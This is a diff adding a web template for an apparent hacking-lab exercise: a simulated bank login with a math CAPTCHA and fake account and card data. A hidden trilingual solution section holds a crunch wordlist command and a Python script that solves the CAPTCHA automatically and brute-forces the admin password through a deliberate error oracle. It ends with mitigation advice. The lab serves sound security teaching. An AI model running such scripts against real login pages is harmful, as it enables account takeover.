@@ -1,0 +1,568 @@
+{% extends "base.html" %}
+{% block title %}V13 – CAPTCHA Bypass - HackLabs{% endblock %}
+{% block content %}
+<div class="p-6 max-w-3xl mx-auto">
+  {% include '_lab_header.html' %}
+
+  {% if not success %}
+  <div class="hl-card mb-4">
+    <div class="lab-description">
+      <div class="lang-content" data-lang="es">
+        <p class="text-sm text-gray-600 dark:text-gray-400">Este laboratorio simula un login bancario protegido por un CAPTCHA matem&aacute;tico. El objetivo es analizar el flujo de autenticaci&oacute;n, automatizar la resoluci&oacute;n del CAPTCHA y recuperar el acceso como admin para revisar datos sensibles simulados.</p>
+      </div>
+      <div class="lang-content" data-lang="en" style="display:none">
+        <p class="text-sm text-gray-600 dark:text-gray-400">
+          This lab simulates an online banking login protected by a math CAPTCHA inside a controlled environment.
+          The goal is to analyze the authentication flow, automate CAPTCHA solving and recover access as <code>admin</code> to review simulated sensitive data.
+        </p>
+      </div>
+    </div>
+  </div>
+  {% endif %}
+
+  <div class="hl-card mb-4">
+    <h2 class="text-sm font-semibold mb-4" style="color:var(--hl-primary)">
+      <span class="lang-content" data-lang="es">Banca online</span>
+      <span class="lang-content" data-lang="en" style="display:none">Online banking</span>
+    </h2>
+
+    {% if error_key %}
+    <div class="mb-4 alert-error flex items-start gap-2">
+      <i class="ph ph-warning-circle mt-0.5"></i>
+      <span class="lang-content" data-lang="es">{{ captcha_error_messages[error_key]['es'] }}</span>
+      <span class="lang-content" data-lang="en" style="display:none">{{ captcha_error_messages[error_key]['en'] }}</span>
+    </div>
+    {% elif error %}
+    <div class="mb-4 alert-error flex items-start gap-2">
+      <i class="ph ph-warning-circle mt-0.5"></i>
+      <span>{{ error }}</span>
+    </div>
+    {% endif %}
+
+    {% if success %}
+    <div class="mb-4 alert-success">
+      <div class="text-xs font-semibold">
+        <span class="lang-content" data-lang="es">Login correcto</span>
+        <span class="lang-content" data-lang="en" style="display:none">Login successful</span>
+      </div>
+    </div>
+
+    <div class="space-y-4">
+      <div class="rounded-lg p-4" style="background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08)">
+        <div class="flex items-center justify-between gap-3 mb-4">
+          <div>
+            <p class="text-xs uppercase tracking-wide text-gray-500 dark:text-gray-400">
+              <span class="lang-content" data-lang="es">Cliente premium</span>
+              <span class="lang-content" data-lang="en" style="display:none">Premium client</span>
+            </p>
+            <h3 class="font-display text-xl font-bold text-gray-900 dark:text-white">Admin Root</h3>
+          </div>
+          <div class="w-10 h-10 rounded-lg flex items-center justify-center flex-shrink-0" style="background:rgba(var(--hl-primary-rgb),.14);color:var(--hl-primary)">
+            <i class="ph ph-bank text-xl"></i>
+          </div>
+        </div>
+
+        <div class="grid sm:grid-cols-2 gap-3">
+          <div class="rounded-lg p-3" style="background:#0f0f1a;border:1px solid rgba(255,255,255,.08)">
+            <p class="text-xs text-gray-500 dark:text-gray-400 mb-1">
+              <span class="lang-content" data-lang="es">Saldo disponible</span>
+              <span class="lang-content" data-lang="en" style="display:none">Available balance</span>
+            </p>
+            <p class="font-mono text-lg font-bold" style="color:var(--hl-primary)">1,284,920.44 EUR</p>
+          </div>
+          <div class="rounded-lg p-3" style="background:#0f0f1a;border:1px solid rgba(255,255,255,.08)">
+            <p class="text-xs text-gray-500 dark:text-gray-400 mb-1">IBAN</p>
+            <p class="font-mono text-sm text-gray-100 break-all">ES91 2100 0418 4502 0005 1332</p>
+          </div>
+          <div class="rounded-lg p-3" style="background:#0f0f1a;border:1px solid rgba(255,255,255,.08)">
+            <p class="text-xs text-gray-500 dark:text-gray-400 mb-1">
+              <span class="lang-content" data-lang="es">Tarjeta principal</span>
+              <span class="lang-content" data-lang="en" style="display:none">Primary card</span>
+            </p>
+            <p class="font-mono text-sm text-gray-100">4539 1488 0343 6467</p>
+            <p class="font-mono text-xs text-gray-500 mt-1">Exp 09/29 &middot; CVV 731</p>
+          </div>
+          <div class="rounded-lg p-3" style="background:#0f0f1a;border:1px solid rgba(255,255,255,.08)">
+            <p class="text-xs text-gray-500 dark:text-gray-400 mb-1">
+              <span class="lang-content" data-lang="es">Cuenta de ahorro</span>
+              <span class="lang-content" data-lang="en" style="display:none">Savings account</span>
+            </p>
+            <p class="font-mono text-sm text-gray-100">ES72 0081 1739 0001 2194 4128</p>
+            <p class="font-mono text-xs text-gray-500 mt-1">482,310.90 EUR</p>
+          </div>
+        </div>
+
+        <div class="mt-4 overflow-x-auto">
+          <table class="w-full text-left text-xs">
+            <thead class="text-gray-500 dark:text-gray-400">
+              <tr>
+                <th class="py-2 pr-3 font-semibold">
+                  <span class="lang-content" data-lang="es">Fecha</span>
+                  <span class="lang-content" data-lang="en" style="display:none">Date</span>
+                </th>
+                <th class="py-2 pr-3 font-semibold">
+                  <span class="lang-content" data-lang="es">Concepto</span>
+                  <span class="lang-content" data-lang="en" style="display:none">Description</span>
+                </th>
+                <th class="py-2 text-right font-semibold">
+                  <span class="lang-content" data-lang="es">Importe</span>
+                  <span class="lang-content" data-lang="en" style="display:none">Amount</span>
+                </th>
+              </tr>
+            </thead>
+            <tbody class="font-mono text-gray-300">
+              <tr class="border-t border-gray-800"><td class="py-2 pr-3">2026-05-14</td><td class="py-2 pr-3">SWIFT HOLDING TRANSFER</td><td class="py-2 text-right" style="color:var(--hl-primary)">+92,400.00</td></tr>
+              <tr class="border-t border-gray-800"><td class="py-2 pr-3">2026-05-12</td><td class="py-2 pr-3">PRIVATE CARD SETTLEMENT</td><td class="py-2 text-right text-red-400">-8,190.35</td></tr>
+              <tr class="border-t border-gray-800"><td class="py-2 pr-3">2026-05-09</td><td class="py-2 pr-3">BROKERAGE PAYOUT</td><td class="py-2 text-right" style="color:var(--hl-primary)">+128,700.00</td></tr>
+            </tbody>
+          </table>
+        </div>
+      </div>
+
+      <div class="rounded-lg p-4" style="background:rgba(var(--hl-primary-rgb),.08);border:1px solid rgba(var(--hl-primary-rgb),.35)">
+        <div class="text-xs font-semibold mb-1" style="color:var(--hl-primary)">
+          <span class="lang-content" data-lang="es">Flag localizada</span>
+          <span class="lang-content" data-lang="en" style="display:none">Flag found</span>
+        </div>
+        <code class="text-sm break-all">{{ flag }}</code>
+      </div>
+    </div>
+    {% endif %}
+
+    {% if not success %}
+    <form method="POST" action="{{ url_for('captcha_login') }}" class="space-y-4">
+      <div>
+        <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">
+          <span class="lang-content" data-lang="es">Usuario</span>
+          <span class="lang-content" data-lang="en" style="display:none">Username</span>
+        </label>
+        <input type="text" name="username" value="admin" class="hl-input font-mono" autocomplete="off" />
+      </div>
+
+      <div>
+        <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-1">
+          <span class="lang-content" data-lang="es">Contrase&ntilde;a</span>
+          <span class="lang-content" data-lang="en" style="display:none">Password</span>
+        </label>
+        <div class="relative">
+          <input id="captcha-password" type="password" name="password" class="hl-input font-mono pr-11" autocomplete="off" />
+          <button id="captcha-password-toggle" type="button"
+                  onclick="toggleCaptchaPassword()"
+                  class="absolute right-2 top-1/2 -translate-y-1/2 inline-flex items-center justify-center rounded-md transition"
+                  style="width:30px;height:30px;color:#9ca3af;background:rgba(255,255,255,.04);border:1px solid rgba(255,255,255,.08)"
+                  aria-label="Mostrar u ocultar password" title="Mostrar u ocultar password">
+            <i id="captcha-password-icon" class="ph ph-eye text-sm"></i>
+          </button>
+        </div>
+      </div>
+
+      <div class="rounded-lg p-4" style="background:rgba(255,255,255,.035);border:1px solid rgba(255,255,255,.08)">
+        <div class="flex flex-col sm:flex-row sm:items-end gap-3">
+          <div class="flex-1">
+            <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-2">CAPTCHA</label>
+            <div class="rounded-lg px-4 text-center font-mono text-xl font-bold flex items-center justify-center"
+                 style="height:42px;background:#0f0f1a;border:1px dashed rgba(var(--hl-primary-rgb),.35);color:var(--hl-primary)">
+              <span data-captcha-expression>{{ captcha_question }}</span> =
+            </div>
+          </div>
+          <div class="sm:w-44">
+            <label class="block text-xs font-semibold text-gray-500 dark:text-gray-400 mb-2">
+              <span class="lang-content" data-lang="es">Respuesta</span>
+              <span class="lang-content" data-lang="en" style="display:none">Answer</span>
+            </label>
+            <input type="text" name="captcha" class="hl-input font-mono text-center text-lg"
+                   style="height:42px"
+                   inputmode="numeric" autocomplete="off" required />
+          </div>
+        </div>
+      </div>
+
+      {% if captcha_nonce %}
+      <input type="hidden" name="captcha_nonce" value="{{ captcha_nonce }}" />
+      {% endif %}
+
+      <button type="submit" class="btn-primary w-full justify-center">
+        <i class="ph ph-sign-in"></i>
+        <span class="lang-content" data-lang="es">Acceder a banca</span>
+        <span class="lang-content" data-lang="en" style="display:none">Access banking</span>
+      </button>
+    </form>
+    {% endif %}
+  </div>
+</div>
+
+<div id="resolution-data" class="hidden">
+  <div class="lang-content" data-lang="es">
+    <h3>Objetivo</h3>
+    <p>Automatizar el login bancario de <code>admin</code> resolviendo un CAPTCHA nuevo en cada intento, identificar el password valido y usarlo despues en el formulario para revisar los datos sensibles y localizar la flag.</p>
+
+    <h3>Comportamiento por dificultad</h3>
+    <ul>
+      <li><strong>Easy:</strong> el reto es una suma visible y no hay nonce.</li>
+      <li><strong>Medium:</strong> el reto puede ser suma o resta, hay <code>captcha_nonce</code> y rate-limit moderado.</li>
+      <li><strong>Hard:</strong> el reto incluye tres t&eacute;rminos, el nonce caduca al usarlo y el challenge expira.</li>
+    </ul>
+
+    <h3>Oraculo de errores</h3>
+    <ul>
+      <li>CAPTCHA correcto + credenciales incorrectas: <code>Error: el password debe tener 5 caracteres y el character set a,x,4,M,]</code></li>
+      <li>Credenciales correctas + CAPTCHA incorrecto: <code>Error: CAPTCHA incorrecto!</code></li>
+    </ul>
+
+    <h3>Pasos</h3>
+    <ol>
+      <li>Haz <code>GET /captcha/login</code> con una sesi&oacute;n persistente.</li>
+      <li>Extrae el texto de <code>data-captcha-expression</code> y calcula la expresi&oacute;n.</li>
+      <li>Si existe <code>captcha_nonce</code>, env&iacute;alo de vuelta en el POST.</li>
+      <li>Prueba passwords de longitud 5 con el charset <code>{{ captcha_charset }}</code>.</li>
+    </ol>
+
+    <h3>Scripting - Enumeracion del CAPTCHA</h3>
+    <p>Primero hacemos una peticion GET para entender como cambia el reto y que cookie de sesion entrega el servidor.</p>
+    <pre><code class="language-python">import re
+import requests
+
+session = requests.Session()
+regex = r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;'
+
+response = session.get('{{ target_base }}/captcha/login')
+output = re.search(regex, response.text)
+
+print(session.cookies.get_dict())
+print(output.group(1))
+</code></pre>
+    <p>Al ejecutarlo varias veces veras una cookie de sesion y una operacion diferente en cada carga.</p>
+    <pre><code class="language-text">{'session': '...'}
+6835 + 600
+
+{'session': '...'}
+7067 + 9674
+
+{'session': '...'}
+8210 + 5603</code></pre>
+
+    <h3>Generar diccionario</h3>
+    <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
+
+    <h3>Bruteforce con passwords.txt</h3>
+    <pre><code class="language-python">import re
+import time
+
+import requests
+
+BASE = "{{ target_base }}"
+CAPTCHA_RE = re.compile(r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;')
+NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
+SUCCESS_RE = re.compile(r'alert-success[\s\S]{0,500}(Login correcto|Login successful)')
+GREEN = "\033[92m"
+RESET = "\033[0m"
+
+
+def fetch_challenge(session):
+    response = session.get(f'{BASE}/captcha/login', timeout=10)
+    expression = CAPTCHA_RE.search(response.text).group(1)
+    nonce = NONCE_RE.search(response.text)
+    return expression, nonce.group(1) if nonce else None
+
+
+session = requests.Session()
+
+with open('passwords.txt', 'r', encoding='utf-8') as f:
+    for password in f:
+        password = password.strip()
+        if not password:
+            continue
+
+        while True:
+            expression, nonce = fetch_challenge(session)
+            cookies = session.cookies.get_dict()
+            captcha = eval(expression, {"__builtins__": {}}, {})
+
+            print("Probando password: " + password)
+            data = {
+                "username": "admin",
+                "password": password,
+                "captcha": captcha,
+            }
+            if nonce:
+                data["captcha_nonce"] = nonce
+
+            response = session.post(
+                f'{BASE}/captcha/login',
+                cookies=cookies,
+                data=data,
+                timeout=10,
+            )
+            visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+            if response.status_code == 429 or "Demasiados intentos" in visible_html:
+                time.sleep(10)
+                continue
+            break
+
+        if SUCCESS_RE.search(visible_html):
+            print(GREEN + "Password valido: " + password + RESET)
+            break</code></pre>
+
+    <p>Con el password valido identificado, vuelve al formulario del laboratorio, inicia sesion como <code>admin</code> y revisa el panel bancario para encontrar la flag.</p>
+
+    <h3>Mitigacion</h3>
+    <p>No confies en retos que el cliente puede leer y resolver trivialmente. Aplica controles del lado servidor: anti-automation por cuenta/IP, caducidad corta, tokens de un solo uso, monitorizacion y un proveedor CAPTCHA resistente a automatizacion.</p>
+
+    <h3>Herramientas</h3>
+    <div><span class="tools-badge">Python requests</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">crunch</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="en" style="display:none">
+    <h3>Goal</h3>
+    <p>Automate the <code>admin</code> banking login by solving a fresh CAPTCHA for every attempt, identify the valid password and then use it in the form to review the sensitive data and locate the flag.</p>
+
+    <h3>Behavior by difficulty</h3>
+    <ul>
+      <li><strong>Easy:</strong> visible addition and no nonce.</li>
+      <li><strong>Medium:</strong> addition or subtraction, <code>captcha_nonce</code> and moderate rate-limit.</li>
+      <li><strong>Hard:</strong> three-term expression, one-use nonce and expiring challenge.</li>
+    </ul>
+
+    <h3>Error oracle</h3>
+    <ul>
+      <li>Correct CAPTCHA + bad credentials: <code>Error: the password must have 5 characters and use the character set a,x,4,M,]</code></li>
+      <li>Correct credentials + bad CAPTCHA: <code>Error: CAPTCHA incorrect!</code></li>
+    </ul>
+
+    <h3>Steps</h3>
+    <ol>
+      <li>Send <code>GET /captcha/login</code> with a persistent session.</li>
+      <li>Extract the text from <code>data-captcha-expression</code> and calculate the expression.</li>
+      <li>If <code>captcha_nonce</code> exists, submit it back with the POST.</li>
+      <li>Try 5-character passwords using the charset <code>{{ captcha_charset }}</code>.</li>
+    </ol>
+
+    <h3>Scripting - CAPTCHA enumeration</h3>
+    <p>Start with a GET request to understand how the challenge changes and which session cookie the server returns.</p>
+    <pre><code class="language-python">import re
+import requests
+
+session = requests.Session()
+regex = r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;'
+
+response = session.get('{{ target_base }}/captcha/login')
+output = re.search(regex, response.text)
+
+print(session.cookies.get_dict())
+print(output.group(1))
+</code></pre>
+    <p>Running it several times shows a session cookie and a different operation on each load.</p>
+    <pre><code class="language-text">{'session': '...'}
+6835 + 600
+
+{'session': '...'}
+7067 + 9674
+
+{'session': '...'}
+8210 + 5603</code></pre>
+
+    <h3>Dictionary</h3>
+    <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
+
+    <h3>Bruteforce with passwords.txt</h3>
+    <pre><code class="language-python">import re
+import time
+
+import requests
+
+BASE = "{{ target_base }}"
+CAPTCHA_RE = re.compile(r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;')
+NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
+SUCCESS_RE = re.compile(r'alert-success[\s\S]{0,500}(Login correcto|Login successful)')
+GREEN = "\033[92m"
+RESET = "\033[0m"
+
+
+def fetch_challenge(session):
+    response = session.get(f'{BASE}/captcha/login', timeout=10)
+    expression = CAPTCHA_RE.search(response.text).group(1)
+    nonce = NONCE_RE.search(response.text)
+    return expression, nonce.group(1) if nonce else None
+
+
+session = requests.Session()
+
+with open('passwords.txt', 'r', encoding='utf-8') as f:
+    for password in f:
+        password = password.strip()
+        if not password:
+            continue
+
+        while True:
+            expression, nonce = fetch_challenge(session)
+            cookies = session.cookies.get_dict()
+            captcha = eval(expression, {"__builtins__": {}}, {})
+
+            print("Testing password: " + password)
+            data = {
+                "username": "admin",
+                "password": password,
+                "captcha": captcha,
+            }
+            if nonce:
+                data["captcha_nonce"] = nonce
+
+            response = session.post(
+                f'{BASE}/captcha/login',
+                cookies=cookies,
+                data=data,
+                timeout=10,
+            )
+            visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+            if response.status_code == 429 or "Demasiados intentos" in visible_html:
+                time.sleep(10)
+                continue
+            break
+
+        if SUCCESS_RE.search(visible_html):
+            print(GREEN + "Valid password: " + password + RESET)
+            break</code></pre>
+
+    <p>After identifying the valid password, go back to the lab form, log in as <code>admin</code> and review the banking dashboard to find the flag.</p>
+
+    <h3>Mitigation</h3>
+    <p>Do not trust challenges that the client can read and solve trivially. Enforce server-side controls: account/IP automation limits, short expiry, one-use tokens, monitoring and a CAPTCHA provider designed to resist automation.</p>
+
+    <h3>Tools</h3>
+    <div><span class="tools-badge">Python requests</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">crunch</span></div>
+  </div>
+
+  <div class="lang-content" data-lang="pt" style="display:none">
+    <h3>Objetivo</h3>
+    <p>Automatizar o login bancário de <code>admin</code> resolvendo um novo CAPTCHA a cada tentativa, identificar a senha válida e utilizá-la em seguida no formulário para inspecionar os dados sensíveis e localizar a flag.</p>
+
+    <h3>Comportamento por dificuldade</h3>
+    <ul>
+      <li><strong>Fácil:</strong> o desafio é uma soma visível e não há nonce.</li>
+      <li><strong>Médio:</strong> o desafio pode ser soma ou subtração, possui <code>captcha_nonce</code> e rate-limiting moderado.</li>
+      <li><strong>Difícil:</strong> a expressão contém três termos, o nonce é de uso único e o desafio expira rapidamente.</li>
+    </ul>
+
+    <h3>Oráculo de erros</h3>
+    <ul>
+      <li>CAPTCHA correto + credenciais incorretas: <code>Error: the password must have 5 characters and use the character set a,x,4,M,]</code></li>
+      <li>Credenciais corretas + CAPTCHA incorreto: <code>Error: CAPTCHA incorrect!</code></li>
+    </ul>
+
+    <h3>Passos</h3>
+    <ol>
+      <li>Envie uma requisição <code>GET /captcha/login</code> com uma sessão persistente.</li>
+      <li>Extraia o texto de <code>data-captcha-expression</code> e calcule o resultado da expressão matemática.</li>
+      <li>Se o <code>captcha_nonce</code> existir, envie-o de volta na requisição POST.</li>
+      <li>Teste senhas de 5 caracteres utilizando o charset <code>{{ captcha_charset }}</code>.</li>
+    </ol>
+
+    <h3>Scripting — Enumeração do CAPTCHA</h3>
+    <p>Comece com uma requisição GET para entender como o desafio muda e qual cookie de sessão o servidor retorna.</p>
+    <pre><code class="language-python">import re
+import requests
+
+session = requests.Session()
+regex = r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;'
+
+response = session.get('{{ target_base }}/captcha/login')
+output = re.search(regex, response.text)
+
+print(session.cookies.get_dict())
+print(output.group(1))
+</code></pre>
+    <p>Ao executar o script várias vezes, você verá um cookie de sessão e uma operação matemática diferente a cada requisição.</p>
+    <pre><code class="language-text">{'session': '...'}
+6835 + 600
+
+{'session': '...'}
+7067 + 9674
+
+{'session': '...'}
+8210 + 5603</code></pre>
+
+    <h3>Geração de dicionário</h3>
+    <pre><code class="language-bash">crunch 5 5 '{{ captcha_charset }}' -o passwords.txt</code></pre>
+
+    <h3>Força bruta com passwords.txt</h3>
+    <pre><code class="language-python">import re
+import time
+
+import requests
+
+BASE = "{{ target_base }}"
+CAPTCHA_RE = re.compile(r'&lt;span data-captcha-expression&gt;(.*?)&lt;/span&gt;')
+NONCE_RE = re.compile(r'name="captcha_nonce"\s+value="([^"]+)"')
+SUCCESS_RE = re.compile(r'alert-success[\s\S]{0,500}(Login correcto|Login successful)')
+GREEN = "\033[92m"
+RESET = "\033[0m"
+
+
+def fetch_challenge(session):
+    response = session.get(f'{BASE}/captcha/login', timeout=10)
+    expression = CAPTCHA_RE.search(response.text).group(1)
+    nonce = NONCE_RE.search(response.text)
+    return expression, nonce.group(1) if nonce else None
+
+
+session = requests.Session()
+
+with open('passwords.txt', 'r', encoding='utf-8') as f:
+    for password in f:
+        password = password.strip()
+        if not password:
+            continue
+
+        while True:
+            expression, nonce = fetch_challenge(session)
+            cookies = session.cookies.get_dict()
+            captcha = eval(expression, {"__builtins__": {}}, {})
+
+            print("Testing password: " + password)
+            data = {
+                "username": "admin",
+                "password": password,
+                "captcha": captcha,
+            }
+            if nonce:
+                data["captcha_nonce"] = nonce
+
+            response = session.post(
+                f'{BASE}/captcha/login',
+                cookies=cookies,
+                data=data,
+                timeout=10,
+            )
+            visible_html = response.text.split('&lt;div id="resolution-data"', 1)[0]
+            if response.status_code == 429 or "Demasiados intentos" in visible_html:
+                time.sleep(10)
+                continue
+            break
+
+        if SUCCESS_RE.search(visible_html):
+            print(GREEN + "Valid password: " + password + RESET)
+            break</code></pre>
+
+    <p>Após identificar a senha válida, retorne ao formulário do laboratório, faça login como <code>admin</code> e revise o painel bancário para encontrar a flag.</p>
+
+    <h3>Mitigação</h3>
+    <p>Não confie em desafios que o cliente possa ler e resolver de forma trivial. Aplique controles no lado do servidor: limites de automação por conta/IP, expiração curta, tokens de uso único, monitoramento e um provedor de CAPTCHA projetado para resistir a automações.</p>
+
+    <h3>Ferramentas</h3>
+    <div><span class="tools-badge">Python requests</span> <span class="tools-badge">Burp Suite</span> <span class="tools-badge">crunch</span></div>
+  </div>
+</div>
+{% endblock %}
+
+{% block scripts %}
+<script>
+function toggleCaptchaPassword() {
+  const input = document.getElementById('captcha-password');
+  const icon = document.getElementById('captcha-password-icon');
+  if (!input || !icon) return;
+  const show = input.type === 'password';
+  input.type = show ? 'text' : 'password';
+  icon.className = show ? 'ph ph-eye-slash text-sm' : 'ph ph-eye text-sm';
+}
+</script>
+{% endblock %}
